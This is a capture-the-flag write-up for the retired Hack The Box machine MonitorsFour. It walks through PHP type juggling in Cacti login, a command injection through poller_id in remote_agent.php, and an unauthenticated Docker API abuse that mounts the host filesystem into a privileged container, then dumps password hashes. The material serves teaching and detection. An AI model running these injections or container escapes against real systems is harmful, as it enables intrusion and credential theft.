---
machine: MonitorsFour
os: Windows
difficulty: Insane
platform: Hack The Box
category: Machines
state: Retired
tags: [windows, cacti, type-juggling, cve, docker-api, container-escape]
---

# MonitorsFour — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired (ref.), publishable.
> Reference notes for a retired box. No real flags or credentials.

## TL;DR

Fourth entry in the Monitors saga. **Cacti** with a weak comparison in authentication (PHP type juggling) plus a CVE chain that ends in remote code execution inside the container. The container can reach the **Docker API** on the gateway, so a privileged container with the host root mounted reads the Windows filesystem from inside.

## Recon

```bash
nmap -p- --min-rate 10000 -sV -sC monitorsfour.htb
```

```text
80/tcp    http    Cacti
443/tcp   https   Cacti
2375/tcp  docker  Docker API (network-position dependent)
```

```bash
whatweb http://monitorsfour.htb
curl -s http://monitorsfour.htb/cacti/include/global.php | head
```

The Cacti version is confirmed in `/cacti/include/global.php` or at the login footer.

## Type juggling in authentication

Cacti compares tokens with `==`. In PHP two strings starting with `0e` followed by digits read as `0` in scientific notation, so `"0e123" == "0e999"` holds:

```text
md5("240610708") = 0e462097431906509019562988736854
```

Sending a user/token whose MD5 starts with `0e` and contains only digits satisfies the check and gives a valid session. It is a logic flaw, not a password bypass: the later session-token comparison is what gets skipped.

## Cacti RCE

With a valid session, abuse the poller command injection (`remote_agent.php`, `poller_id`/`host_id`), the classic Cacti chain:

```bash
curl -s "http://monitorsfour.htb/cacti/remote_agent.php?action=polldata&local_data_ids[]=1&host_id=1&poller_id=;id;"
```

The command runs as the web service user inside the container. Launch a reverse shell and stabilise it with `script`.

## Container to host

```bash
cat /proc/1/cgroup          # confirms a container
ip route                    # gateway towards the host
curl -s http://172.17.0.1:2375/version
```

If the API answers without TLS or auth, create a privileged container with the host `/` mounted:

```bash
curl -s -X POST http://172.17.0.1:2375/containers/create?name=pwn \
  -H 'Content-Type: application/json' \
  -d '{"Image":"alpine","Cmd":["/bin/sh","-c","chroot /host /bin/sh"],
       "HostConfig":{"Binds":["/:/host"],"Privileged":true},
       "AttachStdin":true,"AttachStdout":true,"AttachStderr":true,"Tty":true,"OpenStdin":true}'
curl -s -X POST http://172.17.0.1:2375/containers/pwn/start
curl -s -X POST 'http://172.17.0.1:2375/containers/pwn/attach?stream=1&stdout=1&stderr=1&stdin=1'
```

Inside, `/host` is the server disk: `C:\Users\Administrator\Desktop\` and `C:\Users\<user>\Desktop\` are readable, and `chntpw`/`secretsdump` against `/host/Windows/System32/config` yields the local hashes.

## Lessons

- Comparing tokens with `==` in PHP turns a session check into a trivial bypass; use `hash_equals`.
- A monitoring tool with a command-injection CVE is direct RCE when exposed.
- Mounting `docker.sock` or publishing API 2375 hands over the host: the container stops being a security boundary.
- Detection: `remote_agent.php` requests with a suspicious `poller_id`, `sh` children of the web server, and container creation from an application IP.
